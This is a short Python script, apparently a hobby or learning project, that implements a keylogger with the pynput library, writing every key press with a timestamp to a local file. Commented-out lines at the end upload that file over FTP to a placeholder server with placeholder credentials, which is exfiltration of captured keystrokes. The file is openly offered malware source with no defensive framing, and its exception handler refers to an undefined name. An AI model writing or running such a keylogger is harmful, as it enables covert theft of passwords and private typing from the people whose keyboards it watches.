from pynput.keyboard import Key, Listener
#import key 
#import Listener
import ftplib
import logging


logdir = ""

logging.basicConfig(filename=(logdir+"klog-res.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))

def releasing_key(key):
    if key == Key.esc:
        return False

print("\nStarted listening...\n")   

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()

#print("\nConnecting to the FTP and Sending the data...\n")

#sess = ftplib.FTP("X.X.X.X", "user", "pass")
#file = open("klog-res.txt", "rb")
#sess.storbinary("STOR klog-res.txt", file)
#file.close()
#sess.quit()
